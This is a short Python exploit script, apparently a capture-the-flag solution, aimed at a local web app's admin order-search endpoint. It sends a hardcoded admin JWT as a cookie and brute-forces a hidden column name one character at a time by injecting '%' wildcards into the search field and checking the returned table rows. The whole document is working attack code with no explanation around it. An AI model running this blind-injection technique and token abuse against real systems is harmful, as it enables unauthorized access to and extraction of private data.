import requests
import string

URL = "http://127.0.0.1:5000"
admin_tok = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.F5LymIXr29umPedMOVxMbYgtktSy96AwF9dKtP9CyYw" 
CHARSET = string.ascii_lowercase + string.digits + "{}/\-_"

def search_order_history(search_text):
    endpoint = "/admin/search_order_history"
    cookies = {"token": admin_tok}
    params = {
        "category": "username",
        "search_text": search_text
    }
    response = requests.get(URL + endpoint, cookies=cookies, params=params)
    return response.text

def is_correct_column(search_text):
    response_text = search_order_history(search_text)
    if "<td>1</td>" in response_text and "<td>Phone</td>" in response_text:
        return True
    return False

def brute_force_flag_column():
    column_name = "f"
    while True:
        found_char = False
        for char in CHARSET:
            test_text = column_name + char + "%"
            if is_correct_column(test_text):
                column_name += char
                found_char = True
                print(f"[+] Found character: {char} | Current column : {column_name}")
                break
        if not found_char:

            break
    return column_name

if __name__ == "__main__":
    flag_table = brute_force_flag_column()
    print(f"[+] Flag column: {flag_table}")